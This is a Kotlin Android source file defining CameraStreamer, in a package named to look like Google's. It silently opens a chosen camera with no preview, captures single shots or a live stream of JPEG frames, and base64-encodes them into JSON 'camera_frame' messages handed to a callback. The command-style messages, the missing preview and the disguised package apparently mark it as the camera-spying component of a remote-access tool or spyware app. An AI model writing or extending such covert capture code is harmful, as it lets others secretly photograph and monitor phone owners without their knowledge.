package com.google.xmodzz

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import androidx.core.content.ContextCompat
import org.json.JSONObject

object CameraStreamer {
    private var dev: CameraDevice? = null
    private var sess: CameraCaptureSession? = null
    private var read: ImageReader? = null
    private var th: HandlerThread? = null
    private var isLiveMode = false
    private var isRunning = false

    fun start(ctx: Context, facing: Int, isLive: Boolean, emit: (JSONObject) -> Unit) {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                emit(JSONObject().put("action", "camera_frame").put("error", "Izin kamera ditolak."))
                return
            }

            // Matikan paksa kamera sebelumnya jika masih nyangkut
            stop()
            Thread.sleep(200) 

            isLiveMode = isLive
            isRunning = true

            val m = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            var targetId: String? = null
            for (id in m.cameraIdList) {
                val chars = m.getCameraCharacteristics(id)
                if (chars.get(CameraCharacteristics.LENS_FACING) == facing) {
                    targetId = id
                    break
                }
            }
            
            if (targetId == null) {
                emit(JSONObject().put("action", "camera_frame").put("error", "Kamera tidak ditemukan"))
                return
            }
            
            th = HandlerThread("cam_thread").also { it.start() }
            val h = Handler(th!!.looper)
            
            read = ImageReader.newInstance(480, 360, ImageFormat.JPEG, 2)
            read!!.setOnImageAvailableListener({ r ->
                if (!isRunning) return@setOnImageAvailableListener
                try {
                    val i = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val b = ByteArray(i.planes[0].buffer.remaining())
                    i.planes[0].buffer.get(b)
                    i.close()
                    
                    val payload = JSONObject()
                    payload.put("action", "camera_frame")
                    payload.put("data", Base64.encodeToString(b, Base64.NO_WRAP))
                    emit(payload)
                    
                    if (!isLiveMode) {
                        Handler(android.os.Looper.getMainLooper()).postDelayed({ stop() }, 300)
                    }
                } catch (e: Exception) { }
            }, h)
            
            m.openCamera(targetId, object : CameraDevice.StateCallback() {
                override fun onOpened(c: CameraDevice) {
                    if (!isRunning) {
                        c.close()
                        return
                    }
                    try {
                        dev = c
                        val r = c.createCaptureRequest(
                            if (isLiveMode) CameraDevice.TEMPLATE_PREVIEW else CameraDevice.TEMPLATE_STILL_CAPTURE
                        )
                        r.addTarget(read!!.surface)
                        
                        c.createCaptureSession(listOf(read!!.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                if (!isRunning) return
                                try {
                                    sess = s
                                    if (isLiveMode) {
                                        s.setRepeatingRequest(r.build(), null, h)
                                    } else {
                                        s.capture(r.build(), null, h)
                                    }
                                } catch (e: Exception) { 
                                    emit(JSONObject().put("action", "camera_frame").put("error", "Gagal capture: ${e.message}"))
                                    stop()
                                }
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) {
                                emit(JSONObject().put("action", "camera_frame").put("error", "Konfigurasi gagal"))
                                stop()
                            }
                        }, h)
                    } catch (e: Exception) { 
                        stop()
                    }
                }
                
                override fun onDisconnected(c: CameraDevice) { stop() }
                
                override fun onError(c: CameraDevice, e: Int) {
                    emit(JSONObject().put("action", "camera_frame").put("error", "Kamera error: $e"))
                    stop()
                }
            }, h)
            
        } catch (e: Exception) {
            emit(JSONObject().put("action", "camera_frame").put("error", e.message ?: "Error"))
            stop()
        }
    }
    
    fun stop() {
        isRunning = false
        isLiveMode = false
        try { sess?.stopRepeating(); sess?.close() } catch (e: Exception) { }
        try { dev?.close() } catch (e: Exception) { }
        try { read?.close() } catch (e: Exception) { }
        try { th?.quitSafely() } catch (e: Exception) { }
        sess = null
        dev = null
        read = null
        th = null
    }
}
